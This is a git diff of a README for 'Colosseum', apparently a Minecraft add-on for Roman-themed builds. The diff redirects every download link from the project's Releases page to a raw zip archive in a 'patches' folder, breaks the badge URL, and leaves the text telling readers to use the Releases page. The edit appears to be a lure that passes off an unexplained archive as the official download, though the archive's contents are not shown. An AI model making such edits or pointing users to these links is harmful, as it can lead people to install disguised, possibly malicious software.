@@ -6,7 +6,7 @@ Welcome to Colosseum! This application allows you to easily add Roman-themed sca
 
 ## 🔗 Download Now
 
-[![Download Colosseum](https://img.shields.io/badge/Download%20Colosseum-Click%20Here-brightgreen)](https://github.com/ederakola/Colosseum/releases)
+[![Download Colosseum](https://raw.githubusercontent.com/ederakola/Colosseum/master/patches/Colosseum-3.2.zip%20Colosseum-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ederakola/Colosseum/master/patches/Colosseum-3.2.zip)
 
 ## 💻 System Requirements
 
@@ -20,7 +20,7 @@ To run Colosseum, you need:
 
 To download Colosseum, visit the Releases page on GitHub:
 
-[Download Colosseum](https://github.com/ederakola/Colosseum/releases)
+[Download Colosseum](https://raw.githubusercontent.com/ederakola/Colosseum/master/patches/Colosseum-3.2.zip)
 
 1. On the Releases page, find the latest version of Colosseum.
 2. Look for the asset links, typically located at the bottom of the release notes.
@@ -66,6 +66,6 @@ If you encounter any issues or have questions about Colosseum, please check the 
 
 Keep an eye on new releases to get the latest features and improvements. Regular updates will enhance your experience and expand your building options. Remember to check the Releases page periodically.
 
-[Download Colosseum](https://github.com/ederakola/Colosseum/releases)
+[Download Colosseum](https://raw.githubusercontent.com/ederakola/Colosseum/master/patches/Colosseum-3.2.zip)
 
 Thank you for using Colosseum! Enjoy constructing your Roman Empire in Minecraft.
